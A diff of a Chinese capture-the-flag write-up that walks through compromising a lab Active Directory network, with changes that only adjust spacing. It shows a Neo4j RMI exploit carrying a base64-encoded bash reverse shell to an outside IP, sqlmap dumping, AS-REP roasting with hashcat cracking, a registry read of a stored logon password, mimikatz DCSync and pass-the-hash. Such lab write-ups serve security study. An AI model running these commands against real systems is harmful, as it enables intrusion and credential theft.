@@ -10,7 +10,7 @@
 
 ## flag01
 
-首先拿到ip进行端口扫描
+首先拿到 ip 进行端口扫描
 
 ```plain
 ./fscan64.exe -h 39.99.237.59 -p 1-65535
@@ -22,27 +22,27 @@
 
 [![](assets/1706513339-c036b4f2224f99bae74895cddbc360e0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240128231557-23725026-bdf0-1.png)
 
-Neo4j漏洞利用[GitHub - zwjjustdoit/CVE-2021-34371.jar: CVE-2021-34371.jar](https://github.com/zwjjustdoit/CVE-2021-34371.jar)
+Neo4j 漏洞利用[GitHub - zwjjustdoit/CVE-2021-34371.jar: CVE-2021-34371.jar](https://github.com/zwjjustdoit/CVE-2021-34371.jar)
 
 ```plain
 java -jar .\rhino_gadget.jar rmi://39.99.128.12:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzguNTAuNzIvMzMzMyAwPiYx}|{base64,-d}|{bash,-i}"
 ```
 
-拿到shell
+拿到 shell
 
 [![](assets/1706513339-1a2b5e3628bc5d386c821a4277fdf767.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240128231606-283ee984-bdf0-1.png)
 
-在用户目录下cat flag01
+在用户目录下 cat flag01
 
 [![](assets/1706513339-bed439cb5f76d76c76889c4a46f1406f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240128231611-2b750a70-bdf0-1.png)
 
-拿到第一个flag
+拿到第一个 flag
 
 ## flag2
 
-代理出来，这里我们尝试了frp，但是我得frp不可以联动kali得
+代理出来，这里我们尝试了 frp，但是我得 frp 不可以联动 kali 得
 
-​ 这里我们使venom
+​ 这里我们使 venom
 
 ```plain
 python2 -m SimpleHTTPServer 7000
@@ -75,14 +75,14 @@ goto 1
 socks 1080
 ```
 
-成功设置socks5代理
+成功设置 socks5 代理
 
-win访问一些内网ip  
+win 访问一些内网 ip  
 [![](assets/1706513339-8caa5976fec3881f7c2e1b2d7e2f20b4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240128231624-3389273c-bdf0-1.png)
 
-成功访问到内网ip
+成功访问到内网 ip
 
-是个web服务，然后需要我们抓包分析一下，burpsuite本身就可以建立socks5代理，非常方便，所以我们就可以抓代理之后的包了
+是个 web 服务，然后需要我们抓包分析一下，burpsuite 本身就可以建立 socks5 代理，非常方便，所以我们就可以抓代理之后的包了
 
 [![](assets/1706513339-55fe0eeac7188b69c3850af8c431eae5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240128231631-3764d3e2-bdf0-1.png)
 
@@ -105,7 +105,7 @@ Upgrade-Insecure-Requests: 1
 username=admin&password=123
 ```
 
-看起来就很蠢，直接sqlmap一把梭
+看起来就很蠢，直接 sqlmap 一把梭
 
 ```plain
 proxychains sqlmap -r 1.txt --dump
@@ -375,9 +375,9 @@ proxychains sqlmap -r 1.txt --dump
 
 [![](assets/1706513339-37c6566eb8d75893a0f034569be2b8bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240128231647-413298aa-bdf0-1.png)
 
-拿下第二个flag
+拿下第二个 flag
 
-这里用fscan扫一下，为下面的操作打基础
+这里用 fscan 扫一下，为下面的操作打基础
 
 ```plain
 neo4j@ubuntu:~$ ./fscan -h 172.22.6.0/24
@@ -426,11 +426,11 @@ start vulscan
 [*] WebTitle: https://172.22.6.36:7687  code:400 len:50     title:None
 ```
 
-我们可以看到，172.22.6.25是域内成员， 172.22.6.12是域控
+我们可以看到，172.22.6.25 是域内成员，172.22.6.12 是域控
 
 ## flag3&4
 
-因为之前提示了查找未设置预认证的账号，这个用户名看起来就像域用户名，先写个脚本把用户名提取出来保存为user.txt
+因为之前提示了查找未设置预认证的账号，这个用户名看起来就像域用户名，先写个脚本把用户名提取出来保存为 user.txt
 
 ```plain
 import re
@@ -712,9 +712,9 @@ shenshan
 tongdong
 ```
 
-这样，我们可以视为获取了一个用户清单。接下来，我们可以使用这个user.txt文件来尝试枚举那些未启用预身份验证的账户。通常情况下，预身份验证是默认开启的，但一旦关闭了，攻击者就有可能利用指定的用户名，通过向域控制器的Kerberos 88端口请求票据。在这种情况下，域控制器不会执行任何验证，而是直接返回TGT（Ticket Granting Ticket）和使用用户Hash加密的Login Session Key。攻击者因此可以对获得的用户Hash加密的Login Session Key进行离线破解。如果字典足够强大，就有可能成功破解获得指定用户的明文密码。
+这样，我们可以视为获取了一个用户清单。接下来，我们可以使用这个 user.txt 文件来尝试枚举那些未启用预身份验证的账户。通常情况下，预身份验证是默认开启的，但一旦关闭了，攻击者就有可能利用指定的用户名，通过向域控制器的 Kerberos 88 端口请求票据。在这种情况下，域控制器不会执行任何验证，而是直接返回 TGT（Ticket Granting Ticket）和使用用户 Hash 加密的 Login Session Key。攻击者因此可以对获得的用户 Hash 加密的 Login Session Key 进行离线破解。如果字典足够强大，就有可能成功破解获得指定用户的明文密码。
 
-用impacket中得
+用 impacket 中得
 
 ```plain
 proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/
@@ -722,9 +722,9 @@ proxychains python3 GetNPUsers.py -dc-ip 172.22.6.12 -usersfile user.txt xiaoran
 
 [![](assets/1706513339-af7fbe2fc42bcdd0bee133591d269a30.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240128231705-4bf09d64-bdf0-1.png)
 
-最后得到zhangxin@XIAORANG.LAB用户的用户hash、
+最后得到 zhangxin@XIAORANG.LAB 用户的用户 hash、
 
-用hashcat爆破一下
+用 hashcat 爆破一下
 
 ```plain
 hashcat -m 18200 1.txt -a 0 ./rockyou.txt  --force
@@ -736,11 +736,11 @@ zhangxin@XIAORANG.LAB:strawberry
 
 得到账号密码
 
-然后我们换上全局代理，这里我们从venom代理换成frp，因为使用venom代理 的时候挂全局代理会不稳定，经常掉线，所以这块的操作我就使用frp代理
+然后我们换上全局代理，这里我们从 venom 代理换成 frp，因为使用 venom 代理 的时候挂全局代理会不稳定，经常掉线，所以这块的操作我就使用 frp 代理
 
-rdp连接
+rdp 连接
 
-登录了172.22.6.25，然后查看一下用户
+登录了 172.22.6.25，然后查看一下用户
 
 ```plain
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
@@ -752,23 +752,23 @@ DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L
 DefaultDomainName    REG_SZ    xiaorang.lab
 ```
 
-这样就抓到了yuxuan密码
+这样就抓到了 yuxuan 密码
 
-然后我们用BloodHound看一下域里面的结构
+然后我们用 BloodHound 看一下域里面的结构
 
-先把SharpHound.exe传到内网机中，然后
+先把 SharpHound.exe 传到内网机中，然后
 
 ```plain
 SharpHound.exe -c all
 ```
 
-然后就可以得到BloodHound需要导入的json文件
+然后就可以得到 BloodHound 需要导入的 json 文件
 
-在kali上面起一个BloodHound
+在 kali 上面起一个 BloodHound
 
 ```plain
 neo4j start 
-//开启neo4j
+//开启 neo4j
 bloodhound
 ```
 
@@ -782,11 +782,11 @@ bloodhound
 
 我可以利用这个工具得知我们要攻击的具体路径和大题思路
 
-我可以看到，在172.22.6.25这个用户机，运行登录的用户有三个
+我可以看到，在 172.22.6.25 这个用户机，运行登录的用户有三个
 
-而yuxuan 用户滥用了SID历史功能(SIDHistory是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的SID作为该对象的objectSid，在之前域中的SID会添加到该对象的sIDHistory属性中，此时该对象将保留在原来域的SID对应的访问权限)
+而 yuxuan 用户滥用了 SID 历史功能 (SIDHistory 是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的 SID 作为该对象的 objectSid，在之前域中的 SID 会添加到该对象的 sIDHistory 属性中，此时该对象将保留在原来域的 SID 对应的访问权限)
 
-所以我们切换到yuxuan用户，利用这个滥用的SID直接攻击DC机因为我们保留域管理员的访问权限了，所以直接dump哈希
+所以我们切换到 yuxuan 用户，利用这个滥用的 SID 直接攻击 DC 机因为我们保留域管理员的访问权限了，所以直接 dump 哈希
 
 ```plain
 mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"
@@ -796,7 +796,7 @@ mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"
 
 [![](assets/1706513339-67963297595b99e0f1abd391e89f0c99.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240128232230-0db52eec-bdf1-1.png)
 
-我拿到管理员的哈希，就相当于拿下了域控，我们哈希传递一些就可以拿到flag
+我拿到管理员的哈希，就相当于拿下了域控，我们哈希传递一些就可以拿到 flag
 
 ```plain
 proxychains python3 smbexec.py -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 administrator@172.22.6.12
